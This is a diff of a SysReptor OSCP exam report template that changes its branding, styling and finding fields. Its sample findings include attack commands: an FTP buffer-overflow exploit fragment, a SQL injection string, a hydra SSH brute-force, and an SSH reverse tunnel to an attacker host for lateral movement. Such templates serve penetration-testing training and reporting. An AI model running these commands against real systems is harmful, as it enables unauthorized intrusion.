@@ -1,12 +1,12 @@
 format = "projecttypes/v2"
 id = "de0fcd3c-9548-40e2-8c48-3ab0b4b3c69b"
-name = "OSCP Exam Report v1.2"
+name = "OffSec OSCP+ Exam Report v2.0"
 language = "en-US"
 status = "finished"
 tags = [
-    "offsec",
-    "OffensiveSecurity",
+    "OffSec",
 ]
+finding_ordering = []
 default_notes = []
 report_template = """
 <div id="footer" data-sysreptor-generated="page-footer">
@@ -19,10 +19,10 @@ report_template = """
 
 
 <section id="page-cover" data-sysreptor-generated="page-cover">
-    <div id="page-cover-background" />
+    <img id="page-cover-logo" src="/assets/name/logo-transparent.svg" alt="logo">
     <div id="page-cover-title">
-        <h1>Offensive Security</h1>
-        <h2>{{ report.title }}</h2>
+        <h1>{{ report.title }}</h1>
+        <h2>Exam Report</h2>
     </div>
 
     <div id="page-cover-student">
@@ -52,13 +52,13 @@ report_template = """
 </table-of-contents>
 
 <markdown>
-    # Offensive Security OSCP Exam Penetration Test Report {.in-toc.numbered}
+    # OffSec Certified Professional Exam Report {.in-toc.numbered}
 
     ## Introduction {.in-toc .numbered}
-    The Offensive Security Lab and Exam penetration test report contains all efforts that were conducted in order to pass the Offensive Security course. This report should contain all items that were used to pass the overall exam and it will be graded from a standpoint of correctness and fullness to all aspects of the exam. The purpose of this report is to ensure that the student has a full understanding of penetration testing methodologies as well as the technical knowledge to pass the qualifications for the Offensive Security Certified Professional.
+    The OffSec Certified Professional exam report contains all efforts that were conducted in order to pass the OffSec Certified Professional exam. This report should contain all items that were used to pass the overall exam and it will be graded from a standpoint of correctness and fullness to all aspects of the exam. The purpose of this report is to ensure that the student has a full understanding of penetration testing methodologies as well as the technical knowledge to pass the qualifications for the OffSec Certified Professional.
 
     ## Objective {.in-toc.numbered}
-    The objective of this assessment is to perform an internal penetration test against the Offensive Security Lab and Exam network. The student is tasked with following methodical approach in obtaining access to the objective goals. This test should simulate an actual penetration test and how you would start from beginning to end, including the overall report. An ex-ample page has already been created for you at the latter portions of this document that should give you ample information on what is expected to pass this course. Use the sample report as a guideline to get you through the reporting.
+    The objective of this assessment is to perform an internal penetration test against the OffSec Lab and Exam network. The student is tasked with following a methodical approach to obtaining access to the objective goals. This test should simulate an actual penetration test and how you would start from beginning to end, including the overall report. An example page has already been created for you in the latter portions of this document that should give you ample information on what is expected to pass this course. Use the sample report as a guideline to get you through the reporting.
 
     ## Requirements {.in-toc.numbered}
     The student will be required to fill out this penetration testing report fully and to include the following sections:
@@ -77,39 +77,6 @@ report_template = """
     <div v-if="report.recommendations">
         <h2 id="recommendations" class="in-toc numbered">Recommendations</h2>
         <markdown :text="report.recommendations" />
-    </div>
-
-    <div>
-        <h2 id="finding-summary" class="in-toc numbered">Identified Vulnerabilities</h2>
-        <p>
-            In the course of this penetration test
-            <comma-and-join>
-                <template #critical v-if="finding_stats.count_critical > 0"><strong class="risk-critical">{{ finding_stats.count_critical }} Critical</strong></template>
-                <template #high v-if="finding_stats.count_high > 0"><strong class="risk-high">{{ finding_stats.count_high }} High</strong></template>
-                <template #medium v-if="finding_stats.count_medium > 0"><strong class="risk-medium">{{ finding_stats.count_medium }} Medium</strong></template>
-                <template #low v-if="finding_stats.count_low > 0"><strong class="risk-low">{{ finding_stats.count_low }} Low</strong></template>
-                <template #info v-if="finding_stats.count_info > 0"><strong class="risk-info">{{ finding_stats.count_info }} Info</strong></template>
-            </comma-and-join>
-            vulnerabilities were identified:
-        </p>
-        <table>
-            <thead>
-                <tr>
-                    <th style="width: auto;">Target Name</th>
-                    <th style="width: auto;">IP</th>
-                    <th style="width: 3em;" align="center">CVSS</th>
-                    <th style="width: 3em;" align="center">Page</th>
-                </tr>
-            </thead>
-            <tbody>
-                <tr v-for="finding in findings" class="table-row-link">
-                    <td><ref :to="finding.id">{{ finding.title }}</ref></td>
-                    <td><ref :to="finding.id">{{ finding.ip_address }}</ref></td>
-                    <td align="center" :class="'risk-bg-' + finding.cvss.level"><ref :to="finding.id">{{ finding.cvss.score }}</ref></td>
-                    <td align="center"><ref :to="finding.id" class="ref-page" /></td>
-                </tr>
-            </tbody>
-        </table>
     </div>
 </section>
 <pagebreak />
@@ -135,59 +102,16 @@ report_template = """
 </section>
 <pagebreak />
 
-<section v-if="findings.some(f => !f.isActiveDirectory)">
-    <h1 id="findings" class="in-toc numbered">Independent Challenges</h1>
-    <div v-for="finding in findings.filter(f => !f.isActiveDirectory)">
+<section v-for="group in finding_groups">
+    <h1 class="in-toc numbered">{{ group.label }}</h1>
+    <div v-for="finding in group.findings">
         <h2 :id="finding.id" class="in-toc numbered">{{ finding.title }} ({{ finding.ip_address }})</h2>
         <table class="finding-heading">
             <tr>
-                <td class="table-key">Score:</td>
-                <td align="center" :class="'risk-bg-' + finding.cvss.level">
-                    {{ finding.cvss.score}} ({{ lodash.capitalize(finding.cvss.level) }})
+                <td align="center" class="table-key"><strong>Severity:</strong></td>
+                <td align="center" :class="'risk-bg-' + finding.severity.value">
+                    <strong>{{ finding.severity.label }}</strong>
                 </td>
-            </tr>
-            <tr>
-                <td class="table-key">Vector:</td>
-                <td>{{ finding.cvss.vector || 'n/a' }}</td>
-            </tr>
-        </table>
-
-        <div v-if="finding.serviceenum">
-            <h3 class="in-toc numbered">Service Enumeration</h3>
-            <markdown :text="finding.serviceenum" />
-        </div>
-        <div v-if="finding.initialaccess">
-            <h3 class="in-toc numbered">Initial Access</h3>
-            <markdown :text="finding.initialaccess" />
-        </div>
-
-        <div v-if="finding.privilegeescalation">
-            <h3 class="in-toc numbered">Privilege Escalation</h3>
-            <markdown :text="finding.privilegeescalation" />
-        </div>
-
-        <div v-if="finding.postexploitation">
-            <h3 class="in-toc numbered">Post-Exploitation</h3>
-            <markdown :text="finding.postexploitation" />
-        </div>
-        <pagebreak />
-    </div>
-</section>
-
-<section v-if="findings.some(f => f.isActiveDirectory)">
-    <h1 id="findingsad" class="in-toc numbered">Active Directory Set</h1>
-    <div v-for="finding in findings.filter(f => f.isActiveDirectory)">
-        <h2 :id="finding.id" class="in-toc numbered">{{ finding.title }} ({{ finding.ip_address }})</h2>
-        <table class="finding-heading">
-            <tr>
-                <td class="table-key">Score:</td>
-                <td align="center" :class="'risk-bg-' + finding.cvss.level">
-                    {{ finding.cvss.score}} ({{ lodash.capitalize(finding.cvss.level) }})
-                </td>
-            </tr>
-            <tr>
-                <td class="table-key">Vector:</td>
-                <td>{{ finding.cvss.vector || 'n/a' }}</td>
             </tr>
         </table>
 
@@ -244,6 +168,17 @@ report_styles = """
     --color-risk-medium: #FFDA00;
     --color-risk-low: #4285F5;
     --color-risk-info: #00AE51;
+    
+    --color-primary: #56322c;
+    --color-secondary: rgba(230, 97, 36);
+
+    --color-table-header: var(--color-primary);
+    --color-table-header-text: white;
+    --color-table-row-even: rgb(221, 221, 221);
+    --color-table-row-odd: white;
+    --color-table-content: #151515;
+
+    --color-code: rgb(221, 221, 221);
 }
 
 /* Font settings */
@@ -261,8 +196,8 @@ html {
 
 a {
     font-style: italic;
-    text-decoration: none;
-    color: inherit;
+    text-decoration: underline;
+    color: var(--color-secondary);
 }
 
 pre code {
@@ -270,7 +205,7 @@ pre code {
     padding: 0.2em !important;
 }
 code {
-    background-color: rgb(221, 221, 221);
+    background-color: var(--color-code);
 }
 
 
@@ -281,8 +216,9 @@ table {
     table-layout: auto;
 }
 th {
-    background-color: #ABABAB;
     font-weight: bold;
+    background-color: var(--color-table-header);
+    color: var(--color-table-header-text);
 }
 tr.table-row-link td {
     padding: 0;
@@ -295,7 +231,20 @@ tr.table-row-link td a {
     font-style: inherit;
 }
 .table-key {
-    background-color: #ABABAB;
+    background-color: var(--color-table-header);
+    color: var(--color-table-header-text);
+}
+tr {
+    color: var(--color-table-content);
+}
+tr:nth-child(even) {
+    background-color: var(--color-table-row-even);
+}
+tr:nth-child(odd) {
+    background-color: var(--color-table-row-odd);
+}
+tr .highlight, tr code {
+    background-color: var(--color-primary);
 }
 
 
@@ -317,10 +266,10 @@ tr.table-row-link td a {
     content: "" !important;
 }
 .ref-page::after {
-  content: target-counter(attr(href), page) !important;
+    content: target-counter(attr(href), page) !important;
 }
 .ref-page .ref-title {
-  display: none !important;
+    display: none !important;
 }
 
 /* Table in finding chapters */
@@ -392,15 +341,16 @@ tr.table-row-link td a {
     @bottom-center {
         content: '';
     }
+    background-color: var(--color-primary);
 }
-#page-cover-background{
+#page-cover-logo {
     position: absolute;
-    margin-top: -35mm;
-    margin-left: -20mm;
-    width: 210mm;
-    height: 297mm;
-    background-color: #E83221;
+    left: 2cm;
+    height: 6cm;
+    transform: translate(-50%, -50%);
+    display: inline-block
 }
+
 /* Title page elements */
 #page-cover-title {
     position: absolute;
@@ -432,9 +382,9 @@ tr.table-row-link td a {
 
 /* #region toc */
 #toc li {
-  list-style: none;
-  margin: 0;
-  padding: 0;
+    list-style: none;
+    margin: 0;
+    padding: 0;
 }
 #toc .ref::before {
     padding-right: 0.5em;
@@ -443,25 +393,25 @@ tr.table-row-link td a {
     content: " " leader(".") " " target-counter(attr(href), page);
 }
 #toc .toc-level1 {
-  font-size: 1.5rem;
-  font-weight: bold;
-  margin-top: 0.8rem;
+    font-size: 1.5rem;
+    font-weight: bold;
+    margin-top: 0.8rem;
 }
 #toc .toc-level2 {
-  font-size: 1.2rem;
-  font-weight: bold;
-  margin-top: 0.5rem;
-  margin-left: 2rem;
+    font-size: 1.2rem;
+    font-weight: bold;
+    margin-top: 0.5rem;
+    margin-left: 2rem;
 }
 #toc .toc-level3 {
-  font-size: 1rem;
-  margin-top: 0.4rem;
-  margin-left: 4rem;
+    font-size: 1rem;
+    margin-top: 0.4rem;
+    margin-left: 4rem;
 }
 #toc .toc-level4 {
-  font-size: 1rem;
-  margin-top: 0;
-  margin-left: 6rem;
+    font-size: 1rem;
+    margin-top: 0;
+    margin-left: 6rem;
 }
 /* #endregion toc */
 """
@@ -515,7 +465,7 @@ id = "title"
 type = "string"
 label = "Title"
 origin = "core"
-default = "OSCP Penetration Test Report"
+default = "OffSec Certified Professional"
 required = true
 spellcheck = true
 
@@ -531,7 +481,7 @@ id = "report_version"
 type = "string"
 label = "Report Version"
 origin = "custom"
-default = "1.0"
+default = "2.0"
 required = true
 spellcheck = false
 
@@ -552,11 +502,9 @@ type = "markdown"
 label = "High-Level Summary"
 origin = "custom"
 default = """
-{{ report.firstname }} {{ report.lastname}} ({{ report.osid}}) was tasked with performing an internal penetration test towards Offensive Security Labs. An internal penetration test is a dedicated attack against internally connected systems. The focus of this test is to perform attacks, similar to those of a hacker and attempt to infiltrate Offensive Security’s internal lab systems – the THINC.local domain. {{ report.firstname }} {{ report.lastname}}’s ({{ report.osid}}) overall objective was to evaluate the network, identify systems, and exploit flaws while reporting the findings back to Offensive Security.
+{{ report.firstname }} {{ report.lastname }} ({{ report.osid }}) was tasked with performing an internal penetration test towards OffSec Labs. An internal penetration test is a dedicated attack against internally connected systems. The focus of this test is to perform attacks, similar to those of a hacker and attempt to infiltrate OffSec’s internal lab systems – the THINC.local domain. {{ report.firstname }} {{ report.lastname }}’s ({{ report.osid }}) overall objective was to evaluate the network, identify systems, and exploit flaws while reporting the findings back to OffSec.
 
-When performing the internal penetration test, there were several alarming vulnerabilities that were identified on Offensive Security’s network. When performing the attacks, {{ report.firstname }} {{ report.lastname}} ({{ report.osid}}) was able to gain access to multiple machines, primarily due to outdated patches and poor security configurations.  During the testing, {{ report.firstname }} {{ report.lastname}} ({{ report.osid}}) had administrative level access to multiple systems. All systems were successfully exploited and access granted.
-
-TODO Adapt summary as required
+When performing the internal penetration test, there were several alarming vulnerabilities that were identified on OffSec’s network. When performing the attacks, {{ report.firstname }} {{ report.lastname }} ({{ report.osid }}) was able to gain access to multiple machines, primarily due to outdated patches and poor security configurations.  During the testing, {{ report.firstname }} {{ report.lastname }} ({{ report.osid }}) had administrative level access to multiple systems. All systems were successfully exploited and access granted.
 """
 required = true
 
@@ -565,11 +513,7 @@ id = "recommendations"
 type = "markdown"
 label = "Recommendations"
 origin = "custom"
-default = """
-{{ report.firstname }} {{ report.lastname}} ({{ report.osid}}) recommends patching the vulnerabilities identified during the testing to ensure that an attacker cannot exploit these systems in the future. One thing to remember is that these systems require frequent patching and once patched, should remain on a regular patch program to protect additional vulnerabilities that are discovered at a later date.
-
-TODO Adapt as required
-"""
+default = "{{ report.firstname }} {{ report.lastname }} ({{ report.osid }}) recommends patching the vulnerabilities identified during the testing to ensure that an attacker cannot exploit these systems in the future. One thing to remember is that these systems require frequent patching and once patched, should remain on a regular patch program to protect additional vulnerabilities that are discovered at a later date."
 required = true
 
 [[report_sections]]
@@ -581,11 +525,7 @@ id = "methodology"
 type = "markdown"
 label = "Methodologies"
 origin = "custom"
-default = """
-{{ report.firstname }} {{ report.lastname}} ({{ report.osid}}) utilized a widely adopted approach to perform penetration testing that is effective in testing how well the Offensive Security Labs and Exam environments are secure. Below is a breakout of how {{ report.firstname }} {{ report.lastname}} ({{ report.osid}}) was able to identify and exploit the variety of systems and includes all individual vulnerabilities found.
-
-TODO Adapt as required
-"""
+default = "{{ report.firstname }} {{ report.lastname }} ({{ report.osid }}) utilized a widely adopted approach to perform penetration testing that is effective in testing how well the OffSec Labs and Exam environments are secure. Below is a breakout of how {{ report.firstname }} {{ report.lastname}} ({{ report.osid}}) was able to identify and exploit the variety of systems and includes all individual vulnerabilities found."
 required = true
 
 [[report_sections.fields]]
@@ -597,13 +537,10 @@ default = """
 The information gathering portion of a penetration test focuses on identifying the scope of the penetration test. During this penetration test, {{ report.firstname }} {{ report.lastname}} ({{ report.osid}})  was tasked with exploiting the lab and exam network. The specific IP addresses were:
 
 **Exam Network:**
-
-* 172.16.203.133
+* 192.168.232.55
 * 172.16.203.134
 * 172.16.203.135
 * 172.16.203.136
-
-TODO Adapt as required
 """
 required = true
 
@@ -612,11 +549,7 @@ id = "serviceenum"
 type = "markdown"
 label = "Service Enumeration"
 origin = "custom"
-default = """
-The service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems. This is valuable for an attacker as it provides detailed information on potential attack vectors into a system. Understanding what applications are running on the system gives an attacker needed information before performing the actual penetration test.  In some cases, some ports may not be listed.
-
-TODO Adapt as required
-"""
+default = "The service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems. This is valuable for an attacker as it provides detailed information on potential attack vectors into a system. Understanding what applications are running on the system gives an attacker needed information before performing the actual penetration test.  In some cases, some ports may not be listed."
 required = true
 
 [[report_sections.fields]]
@@ -624,11 +557,7 @@ id = "penetration"
 type = "markdown"
 label = "Penetration"
 origin = "custom"
-default = """
-The penetration testing portions of the assessment focus heavily on gaining access to a variety of systems. During this penetration test, {{ report.firstname }} {{ report.lastname}} ({{ report.osid}})  was able to successfully gain access to 10 out of the 50 systems.
-
-TODO Adapt as required
-"""
+default = "The penetration testing portions of the assessment focus heavily on gaining access to a variety of systems. During this penetration test, {{ report.firstname }} {{ report.lastname}} ({{ report.osid}}) was able to successfully gain access to 10 out of the 50 systems."
 required = true
 
 [[report_sections.fields]]
@@ -637,11 +566,9 @@ type = "markdown"
 label = "Maintaining Access"
 origin = "custom"
 default = """
-Maintaining access to a system is important to us as attackers, ensuring that we can get back into a system after it has been exploited is invaluable. The maintaining access phase of the penetration test focuses on ensuring that once the focused attack has occurred (i.e. a buffer overflow), we have administrative access over the system again. Many exploits may only be exploitable once and we may never be able to get back into a system after we have already performed the exploit. 
+Maintaining access to a system is important to us as attackers, ensuring that we can get back into a system after it has been exploited is invaluable. The maintaining access phase of the penetration test focuses on ensuring that once the focused attack has occurred (i.e. a buffer overflow), we have administrative access over the system again. Many exploits may only be exploitable once and we may never be able to get back into a system after we have already performed the exploit.
 
-{{ report.firstname }} {{ report.lastname}} ({{ report.osid}})  added administrator and root level accounts on all systems compromised. In addition to the administrative/root access, a Metasploit meterpreter service was installed on the machine to ensure that additional access could be established.
-
-TODO Adapt as required
+{{ report.firstname }} {{ report.lastname }} ({{ report.osid }}) added administrator and root level accounts on all systems compromised. In addition to the administrative/root access, a Metasploit meterpreter service was installed on the machine to ensure that additional access could be established.
 """
 required = true
 
@@ -653,9 +580,7 @@ origin = "custom"
 default = """
 The house cleaning portions of the assessment ensures that remnants of the penetration test are removed. Often fragments of tools or user accounts are left on an organizations computer which can cause security issues down the road. Ensuring that we are meticulous and no remnants of our penetration test are left over is important.
 
-After the trophies on both the lab network and exam network were completed, {{ report.firstname }} {{ report.lastname}} ({{ report.osid}})  removed all user accounts and passwords as well as the Meterpreter services installed on the system. Offensive Security should not have to remove any user accounts or services from the system.
-
-TODO Adapt as required
+After the trophies on both the lab network and exam network were completed, {{ report.firstname }} {{ report.lastname }} ({{ report.osid }}) removed all user accounts and passwords as well as the Meterpreter services installed on the system. OffSec should not have to remove any user accounts or services from the system.
 """
 required = true
 
@@ -668,7 +593,7 @@ id = "appendix_sections"
 type = "list"
 label = "Appendix"
 origin = "custom"
-required = true
+required = false
 
 [report_sections.fields.items]
 id = ""
@@ -712,19 +637,47 @@ required = true
 spellcheck = false
 
 [[finding_fields]]
-id = "isActiveDirectory"
-type = "boolean"
-label = "is Active Directory Set?"
+id = "target_type"
+type = "enum"
+label = "Target Type"
 origin = "custom"
-default = false
+default = "independent"
+required = true
+
+[[finding_fields.choices]]
+label = "Independent Challenges"
+value = "independent"
+
+[[finding_fields.choices]]
+label = "Active Directory Set"
+value = "activedirectoryset"
 
 [[finding_fields]]
-id = "cvss"
-type = "cvss"
-label = "CVSS"
+id = "severity"
+type = "enum"
+label = "Severity"
 origin = "predefined"
-default = "n/a"
 required = true
+
+[[finding_fields.choices]]
+label = "Info"
+value = "info"
+
+[[finding_fields.choices]]
+label = "Low"
+value = "low"
+
+[[finding_fields.choices]]
+label = "Medium"
+value = "medium"
+
+[[finding_fields.choices]]
+label = "High"
+value = "high"
+
+[[finding_fields.choices]]
+label = "Critical"
+value = "critical"
 
 [[finding_fields]]
 id = "serviceenum"
@@ -786,33 +739,28 @@ origin = "custom"
 default = "**System Proof Screenshot:** TODO"
 required = true
 
-[[finding_ordering]]
-field = "cvss"
+[[finding_grouping]]
+field = "target_type"
 order = "desc"
 
-[[finding_ordering]]
-field = "title"
-order = "asc"
-
-[report_preview_data]
 [report_preview_data.report]
-title = "OSCP Penetration Test Report"
+title = "OffSec Certified Professional"
 firstname = "John"
 lastname = "Doe"
 osid = "OS-XXXXX"
 mail = "student@example.com"
-report_date = "2022-07-29"
-report_version = "1.0"
+report_date = "2025-09-30"
+report_version = "2.0"
 watermark = true
 highlevel_summary = """
-{{ report.firstname }} {{ report.lastname}} ({{ report.osid}}) was tasked with performing an internal penetration test towards Offensive Security Labs. An internal penetration test is a dedicated attack against internally connected systems. The focus of this test is to perform attacks, similar to those of a hacker and attempt to infiltrate Offensive Security’s internal lab systems – the THINC.local domain. {{ report.firstname }} {{ report.lastname}}’s ({{ report.osid}}) overall objective was to evaluate the network, identify systems, and exploit flaws while reporting the findings back to Offensive Security.
+{{ report.firstname }} {{ report.lastname }} ({{ report.osid }}) was tasked with performing an internal penetration test towards Offensive Security Labs. An internal penetration test is a dedicated attack against internally connected systems. The focus of this test is to perform attacks, similar to those of a hacker and attempt to infiltrate Offensive Security’s internal lab systems – the THINC.local domain. {{ report.firstname }} {{ report.lastname }}’s ({{ report.osid }}) overall objective was to evaluate the network, identify systems, and exploit flaws while reporting the findings back to Offensive Security.
 
-When performing the internal penetration test, there were several alarming vulnerabilities that were identified on Offensive Security’s network. When performing the attacks, {{ report.firstname }} {{ report.lastname}} ({{ report.osid}}) was able to gain access to multiple machines, primarily due to outdated patches and poor security configurations.  During the testing, {{ report.firstname }} {{ report.lastname}} ({{ report.osid}}) had administrative level access to multiple systems. All systems were successfully exploited and access granted.
+When performing the internal penetration test, there were several alarming vulnerabilities that were identified on Offensive Security’s network. When performing the attacks, {{ report.firstname }} {{ report.lastname }} ({{ report.osid }}) was able to gain access to multiple machines, primarily due to outdated patches and poor security configurations.  During the testing, {{ report.firstname }} {{ report.lastname }} ({{ report.osid }}) had administrative level access to multiple systems. All systems were successfully exploited and access granted.
 """
-recommendations = "{{ report.firstname }} {{ report.lastname}} ({{ report.osid}}) recommends patching the vulnerabilities identified during the testing to ensure that an attacker cannot exploit these systems in the future. One thing to remember is that these systems require frequent patching and once patched, should remain on a regular patch program to protect additional vulnerabilities that are discovered at a later date."
-methodology = "{{ report.firstname }} {{ report.lastname}} ({{ report.osid}}) utilized a widely adopted approach to perform penetration testing that is effective in testing how well the Offensive Security Labs and Exam environments are secure. Below is a breakout of how {{ report.firstname }} {{ report.lastname}} ({{ report.osid}}) was able to identify and exploit the variety of systems and includes all individual vulnerabilities found."
+recommendations = "{{ report.firstname }} {{ report.lastname }} ({{ report.osid }}) recommends patching the vulnerabilities identified during the testing to ensure that an attacker cannot exploit these systems in the future. One thing to remember is that these systems require frequent patching and once patched, should remain on a regular patch program to protect additional vulnerabilities that are discovered at a later date."
+methodology = "{{ report.firstname }} {{ report.lastname }} ({{ report.osid }}) utilized a widely adopted approach to perform penetration testing that is effective in testing how well the Offensive Security Labs and Exam environments are secure. Below is a breakout of how {{ report.firstname }} {{ report.lastname }} ({{ report.osid }}) was able to identify and exploit the variety of systems and includes all individual vulnerabilities found."
 infogathering = """
-The information gathering portion of a penetration test focuses on identifying the scope of the penetration test. During this penetration test, {{ report.firstname }} {{ report.lastname}} ({{ report.osid}})  was tasked with exploiting the lab and exam network. The specific IP addresses were:
+The information gathering portion of a penetration test focuses on identifying the scope of the penetration test. During this penetration test, {{ report.firstname }} {{ report.lastname }} ({{ report.osid }})  was tasked with exploiting the lab and exam network. The specific IP addresses were:
 
 **Exam Network:**
 
@@ -826,24 +774,23 @@ penetration = "The penetration testing portions of the assessment focus heavily 
 maintainaccess = """
 Maintaining access to a system is important to us as attackers, ensuring that we can get back into a system after it has been exploited is invaluable. The maintaining access phase of the penetration test focuses on ensuring that once the focused attack has occurred (i.e. a buffer overflow), we have administrative access over the system again. Many exploits may only be exploitable once and we may never be able to get back into a system after we have already performed the exploit. 
 
-{{ report.firstname }} {{ report.lastname}} ({{ report.osid}})  added administrator and root level accounts on all systems compromised. In addition to the administrative/root access, a Metasploit meterpreter service was installed on the machine to ensure that additional access could be established.
-
+{{ report.firstname }} {{ report.lastname }} ({{ report.osid }})  added administrator and root level accounts on all systems compromised. In addition to the administrative/root access, a Metasploit meterpreter service was installed on the machine to ensure that additional access could be established.
 """
 housecleaning = """
 The house cleaning portions of the assessment ensures that remnants of the penetration test are removed. Often fragments of tools or user accounts are left on an organizations computer which can cause security issues down the road. Ensuring that we are meticulous and no remnants of our penetration test are left over is important.
 
-After the trophies on both the lab network and exam network were completed, {{ report.firstname }} {{ report.lastname}} ({{ report.osid}})  removed all user accounts and passwords as well as the Meterpreter services installed on the system. Offensive Security should not have to remove any user accounts or services from the system.
+After the trophies on both the lab network and exam network were completed, {{ report.firstname }} {{ report.lastname }} ({{ report.osid }})  removed all user accounts and passwords as well as the Meterpreter services installed on the system. Offensive Security should not have to remove any user accounts or services from the system.
 """
 appendix_sections = []
 
 [[report_preview_data.findings]]
 title = "Target #1"
-cvss = "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"
+severity = "critical"
 id = "c7f12f17-96bf-4899-b10f-2b1a513382e8"
-created = "2024-12-09T12:34:29.549244+00:00"
+created = "2025-09-30T08:02:23.719377+00:00"
 order = 1
 ip_address = "172.16.203.134"
-isActiveDirectory = false
+target_type = "independent"
 serviceenum = """
 **Port Scan Results**
 
@@ -917,9 +864,9 @@ print "\\nTry connecting with netcat to port 4444 on the remote machine." except
 print "\\nCould not Connect to FTP Server."
 
 try:
-ftp.transfercmd("STOR " + buffer)
+    ftp.transfercmd("STOR " + buffer)
 except:
-print "\\nDone."
+    print "\\nDone."
 ```
 """
 privilegeescalation = """
@@ -932,6 +879,62 @@ data, ensure that the user is running off of a limited user account, and that an
 ```
 SELECT * FROM login WHERE id = 1 or 1=1 AND user LIKE “%root%"
 ```
-
 """
 postexploitation = ""
+
+[[report_preview_data.findings]]
+title = "Ajla"
+severity = "critical"
+id = "11f16a32-b884-49b2-87cc-ae3d7576423e"
+created = "2025-09-30T10:42:54.438Z"
+order = 2
+ip_address = "10.4.4.10"
+target_type = "activedirectoryset"
+serviceenum = """
+**Port Scan Results**
+
+| IP Address | Ports Open |
+| ------- | ------- |
+| 10.4.4.10  | **TCP:** 22, 80 |
+| 10.5.5.20  | **TCP:** 135, 139, 445, 3389 |
+| 10.5.5.30  | **TCP:** 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 3389 |
+"""
+initialaccess = """
+**Vulnerability Explation:** The user account on the Ajla host was protected by a trivial password that was cracked within 5 minutes of brute-forcing.
+
+**Vulnerability Fix:** The SSH service should be configured to not accept password-based logins and the user account itself should contain a unique password not contained in the publicly available wordlists.
+
+**Steps to reproduce the attack:** from the initial service scan John discovered that this host is called Ajla. After adding the target’s IP to the /etc/hosts file, the Hydra tool was run against the SSH service using the machine’s DNS name instead of its IP. With the extracted password at hand John was able to log in as ajla using SSH.
+
+```
+└─$ hydra -l ajla -P /home/kali/rockyou.txt -T 20 sandbox.local ssh
+```
+
+"""
+privilegeescalation = """
+**Vulnerability Explanation:** sudo group allows any user in this group to escalate privileges to the root if they know the user’s password.
+
+**Vulnerability Fix:** The SSH service should be configured to not accept password-based logins and the user account itself should contain a unique password not contained in the publicly available wordlists.
+
+**Steps to reproduce the attack:** John spotted that the ajla user was a member of the sudo group immediately upon logging in and using the “id” command. And knowing user’s password, he only needed to use a single command “sudo su” in order to obtain a root shell.
+
+"""
+postexploitation = """
+**System Proof Screenshot:**
+TODO: screenshot
+
+After collecting the proof files and establishing a backdoor using SSH, John began the enumeration of the filesystem for the presence of interesting files. He noticed that there was a mounted share originating from the 10.5.5.20 IP. Inspecting a custom sysreport.ps1 script in the /mnt/scripts directory he found cleartext credentials for the “sandbox\\alex” user. Taking into consideration the type of scripts in this directory and the username structure, it seems that the “Poultry” host is a part of the Active Directory environment.
+
+
+
+John began the lateral movement by establishing a reverse dynamic port forwarding using SSH. First, he generated a new pair of SSH keys and added those to the authorized\\_keys file on his Kali VM, then he just needed to issue a single SSH port forwarding command:
+
+
+```
+└─$ ssh-keygen -t rsa -N ‘’ -f \\~/.ssh/key
+
+└─$ ssh -f -N -R 1080 -o “UserKnownHostsFile=/dev/null” -o “StrictHostKeyChecking=no” -I key <kali@192.168.119.164>
+```
+
+With the dynamic reverse tunnel established, John only needed to edit the /etc/proxychains.conf to use the port 1080.
+"""
